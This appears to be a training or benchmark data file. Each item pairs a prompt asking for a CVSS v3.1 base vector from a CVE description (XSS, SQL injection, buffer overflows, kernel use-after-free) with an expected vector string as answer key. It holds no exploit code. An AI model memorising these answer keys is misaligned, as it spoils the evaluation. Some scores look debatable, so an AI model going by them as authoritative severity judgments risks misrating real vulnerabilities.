Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Reflected cross-site scripting (XSS) vulnerabilities in Trend Micro Mobile Security (Enterprise) could allow an exploit against an authenticated victim that visits a malicious link provided by an attacker.  Please note, this vulnerability is similar to, but not identical to, CVE-2023-41177. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: In the Linux kernel, the following vulnerability has been resolved:  soc: qcom: pmic_glink_altmode: fix drm bridge use-after-free  A recent DRM series purporting to simplify support for "transparent bridges" and handling of probe deferrals ironically exposed a use-after-free issue on pmic_glink_altmode probe deferral.  This has manifested itself as the display subsystem occasionally failing to initialise and NULL-pointer dereferences during boot of machines like the Lenovo ThinkPad X13s.  Specifically, the dp-hpd bridge is currently registered before all resources have been acquired which means that it can also be deregistered on probe deferrals.  In the meantime there is a race window where the new aux bridge driver (or PHY driver previously) may have looked up the dp-hpd bridge and stored a (non-reference-counted) pointer to the bridge which is about to be deallocated.  When the display controller is later initialised, this triggers a use-after-free when attaching the bridges:   dp -> aux -> dp-hpd (freed)  which may, for example, result in the freed bridge failing to attach:   [drm:drm_bridge_attach [drm]] *ERROR* failed to attach bridge /soc@0/phy@88eb000 to encoder TMDS-31: -16  or a NULL-pointer dereference:   Unable to handle kernel NULL pointer dereference at virtual address 0000000000000000  ...  Call trace:    drm_bridge_attach+0x70/0x1a8 [drm]    drm_aux_bridge_attach+0x24/0x38 [aux_bridge]    drm_bridge_attach+0x80/0x1a8 [drm]    dp_bridge_init+0xa8/0x15c [msm]    msm_dp_modeset_init+0x28/0xc4 [msm]  The DRM bridge implementation is clearly fragile and implicitly built on the assumption that bridges may never go away. In this case, the fix is to move the bridge registration in the pmic_glink_altmode driver to after all resources have been looked up.  Incidentally, with the new dp-hpd bridge implementation, which registers child devices, this is also a requirement due to a long-standing issue in driver core that can otherwise lead to a probe deferral loop (see commit fbc35b45f9f6 ("Add documentation on meaning of -EPROBE_DEFER")).  [DB: slightly fixed commit message by adding the word 'commit'] 	CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: LlamaIndex (aka llama_index) through 0.9.34 allows SQL injection via the Text-to-SQL feature in NLSQLTableQueryEngine, SQLTableRetrieverQueryEngine, NLSQLRetriever, RetrieverQueryEngine, and PGVectorSQLQueryEngine. For example, an attacker might be able to delete this year's student records via "Drop the Students table" within English language input. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Vyper is a Pythonic Smart Contract Language for the EVM. There is an error in the stack management when compiling the `IR` for `sha3_64`. Concretely, the `height` variable is miscalculated. The vulnerability can't be triggered without writing the `IR` by hand (that is, it cannot be triggered from regular vyper code). `sha3_64` is used for retrieval in mappings. No flow that would cache the `key` was found so the issue shouldn't be possible to trigger when compiling the compiler-generated `IR`. This issue isn't triggered during normal compilation of vyper code so the impact is low. At the time of publication there is no patch available. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Exposure of sensitive information in exceptions in ClichHouse's clickhouse-r2dbc, com.clickhouse:clickhouse-jdbc, and com.clickhouse:clickhouse-client versions less than 0.4.6 allows unauthorized users to gain access to client certificate passwords via client exception logs. This occurs when 'sslkey' is specified and an exception, such as a ClickHouseException or SQLException, is thrown during database operations; the certificate password is then included in the logged exception message. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A use-after-free flaw was found in the __ext4_remount in fs/ext4/super.c in ext4 in the Linux kernel. This flaw allows a local user to cause an information leak problem while freeing the old quota file names before a potential failure, leading to a use-after-free. 	CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The WordPress Button Plugin MaxButtons plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the plugin's shortcode(s) in all versions up to, and including 9.7.6 due to insufficient input sanitization and output escaping on user supplied attributes. This makes it possible for authenticated attackers, with contributor-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. NOTE: This vulnerability was partially fixed in version 9.7.6. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability classified as critical was found in Tongda OA 2017 up to 11.9. Affected by this vulnerability is an unknown functionality of the file /general/attendance/manage/ask_duty/delete.php. The manipulation of the argument ASK_DUTY_ID leads to sql injection. The exploit has been disclosed to the public and may be used. Upgrading to version 11.10 is able to address this issue. It is recommended to upgrade the affected component. The associated identifier of this vulnerability is VDB-252991. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The Lana Shortcodes WordPress plugin before 1.2.0 does not validate and escape some of its shortcode attributes before outputting them back in a page/post where the shortcode is embed, which allows users with the contributor role and above to perform Stored Cross-Site Scripting attacks. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability, which was classified as critical, was found in openBI up to 1.0.8. This affects the function uploadFile of the file /application/index/controller/File.php. The manipulation leads to unrestricted upload. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-252309 was assigned to this vulnerability. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability has been found in Tenda i6 1.0.0.9(3857) and classified as critical. This vulnerability affects the function formSetCfm of the file /goform/setcfm of the component httpd. The manipulation of the argument funcpara1 leads to stack-based buffer overflow. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-252256. NOTE: The vendor was contacted early about this disclosure but did not respond in any way. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability was found in Shanxi Diankeyun Technology NODERP up to 6.0.2 and classified as critical. This issue affects some unknown processing of the file application/index/common.php of the component Cookie Handler. The manipulation of the argument Nod_User_Id/Nod_User_Token leads to improper authentication. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-252275. NOTE: The vendor was contacted early about this disclosure but did not respond in any way. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Improper Verification of Cryptographic Signature vulnerability in Snow Software Inventory Agent on Unix allows File Manipulation through Snow Update Packages.This issue affects Inventory Agent: through 7.3.1. 	CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Deserialization of Untrusted Data vulnerability in Anton Bond Woocommerce Tranzila Payment Gateway.This issue affects Woocommerce Tranzila Payment Gateway: from n/a through 1.0.8. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Tenda AX1803 v1.0.0.1 contains a stack overflow via the adv.iptv.stballvlans parameter in the function getIptvInfo. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The WP-Invoice WordPress plugin through 4.3.1 does not have CSRF check in place when updating its settings, and is lacking sanitisation as well as escaping in some of them, allowing attacker to make a logged in admin change them and add XSS payload in them 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Autolab is a course management service that enables instructors to offer autograded programming assignments to their students over the Web. Path traversal vulnerabilities were discovered in Autolab's assessment functionality in versions of Autolab prior to 2.12.0, whereby instructors can perform arbitrary file reads. Version 2.12.0 contains a patch. There are no feasible workarounds for this issue. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: An file upload vulnerability in Ivanti ITSM before 2023.4, allows an authenticated remote user to perform file writes to the server. Successful exploitation may lead to execution of commands in the context of non-root user. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in Epiphyt Embed Privacy allows Stored XSS.This issue affects Embed Privacy: from n/a through 1.8.0. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: gpac v2.2.1 was discovered to contain a memory leak via the dst_props variable in the gf_filter_pid_merge_properties_internal function. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: route in main.c in Pico HTTP Server in C through f3b69a6 has an sprintf stack-based buffer overflow via a long URI, leading to remote code execution. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Arm provides multiple helpers to clean & invalidate the cache for a given region.  This is, for instance, used when allocating guest memory to ensure any writes (such as the ones during scrubbing) have reached memory before handing over the page to a guest.  Unfortunately, the arithmetics in the helpers can overflow and would then result to skip the cache cleaning/invalidation.  Therefore there is no guarantee when all the writes will reach the memory. 	CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N
